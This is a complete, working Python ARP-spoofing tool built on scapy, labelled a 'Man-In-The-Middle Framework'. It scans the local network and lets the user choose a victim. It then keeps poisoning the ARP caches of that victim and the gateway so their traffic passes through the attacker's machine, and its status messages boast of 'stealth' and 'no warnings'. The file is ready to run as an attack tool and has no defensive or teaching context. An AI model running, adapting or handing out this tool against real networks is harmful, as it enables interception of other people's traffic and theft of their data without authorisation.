from scapy.all import ARP, Ether, srp, sendp, conf, get_if_list
import time
import os
import sys

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
BOLD = "\033[1m"
END = "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_logo():
    logo = f"""
{RED}
 ███╗   ███╗██╗████████╗███╗   ███╗
 ████╗ ████║██║╚══██╔══╝████╗ ████║
 ██╔████╔██║██║   ██║   ██╔████╔██║
 ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
 ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
 ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
{YELLOW}
 >> Man-In-The-Middle Framework v1.0
 >> Developed by: {BOLD}Qorsan Taiz{END}{YELLOW}
    """
    print(logo)

def get_mac(ip, interface):
    try:
        conf.verb = 0
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, retry=3, iface=interface, verbose=False)
        for sent, received in ans:
            return received.hwsrc
    except Exception:
        return None

def scan_network(network_range, interface):
    print(f"{BLUE}[*] Scanning on {interface}...{END}")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), 
                     timeout=3, iface=interface, verbose=0)
        devices = []
        print(f"\n{BOLD}{'ID':<5}{'IP Address':<20}{'MAC Address'}{END}")
        print("-" * 55)
        for i, (sent, received) in enumerate(ans):
            device = {"id": i + 1, "ip": received.psrc, "mac": received.hwsrc}
            devices.append(device)
            print(f"[{device['id']}]  {device['ip']:<18}  {device['mac']}")
        return devices
    except Exception as e:
        print(f"{RED}[!] Scan Error: {e}{END}")
        return []

def spoof(target_ip, spoof_ip, target_mac, interface):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=interface, verbose=False)

def restore(dest_ip, source_ip, dest_mac, source_mac, interface):
    packet = Ether(dst=dest_mac)/ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(packet, count=5, iface=interface, verbose=False)

def main():
    clear_screen()
    show_logo()
    
    ifaces = get_if_list()
    print(f"{YELLOW}[?] Available Interfaces: {', '.join(ifaces)}{END}")
    iface = input(f"{YELLOW}[?] Select Interface (default: {ifaces[0]}): {END}") or ifaces[0]
    
    net_range = input(f"{YELLOW}[?] Enter Network Range (e.g., 192.168.1.0/24): {END}")
    if not net_range: return
    
    devices = scan_network(net_range, iface)
    if not devices:
        print(f"{RED}[-] No targets found. Ensure you are running as sudo.{END}")
        return

    try:
        choice = int(input(f"\n{YELLOW}[?] Select Target ID: {END}"))
        target = next(d for d in devices if d['id'] == choice)
        
        gateway_ip = input(f"{YELLOW}[?] Enter Gateway IP: {END}")
        print(f"{BLUE}[*] Resolving Gateway MAC on {iface}...{END}")
        gateway_mac = get_mac(gateway_ip, iface)

        if not gateway_mac:
            for d in devices:
                if d['ip'] == gateway_ip:
                    gateway_mac = d['mac']
            
            if not gateway_mac:
                print(f"{RED}[!] Critical: Gateway MAC not found.{END}")
                gateway_mac = input(f"{YELLOW}[?] Enter Gateway MAC manually: {END}")

        if not gateway_mac:
            print(f"{RED}[!] Warning: No MAC found. Stealth mode disabled.{END}")
            gateway_mac = "ff:ff:ff:ff:ff:ff"

        print(f"\n{GREEN}[+] Stealth MITM Attack Active (L2 Mode)!{END}")
        
        count = 0
        while True:
            spoof(target['ip'], gateway_ip, target['mac'], iface)
            spoof(gateway_ip, target['ip'], gateway_mac, iface)
            count += 2
            sys.stdout.write(f"\r{GREEN}[+] Injected: {count} packets via {iface} [No Warnings]{END}")
            sys.stdout.flush()
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n\n{BLUE}[!] Cleaning up and restoring network...{END}")
        if gateway_mac:
            restore(target['ip'], gateway_ip, target['mac'], gateway_mac, iface)
            restore(gateway_ip, target['ip'], gateway_mac, target['mac'], iface)
        print(f"{GREEN}[+] Done. Network Restored.{END}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{END}")

if __name__ == "__main__":
    main()
